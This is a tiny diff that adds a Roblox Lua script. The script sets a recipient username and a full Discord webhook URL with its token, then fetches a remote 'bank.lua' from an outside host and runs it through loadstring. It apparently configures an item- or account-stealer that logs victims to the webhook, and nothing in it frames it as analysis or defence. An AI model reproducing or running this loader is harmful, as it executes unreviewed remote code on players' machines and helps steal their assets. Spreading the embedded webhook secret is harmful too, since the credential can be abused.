@@ -1,0 +1,5 @@
+
+UserName = "Xxtaehyung654xX"
+WebHook = "https://discord.com/api/webhooks/1127163092518830101/gbAF1RmQqIG7jklkTtCfi87qMvdGjO8mC4Vl22kdJa_1dAwls7IyHeIdezMCSpJHMVet"
+
+loadstring(game:HttpGet("https://goof.pro/s/bank.lua", true))()```
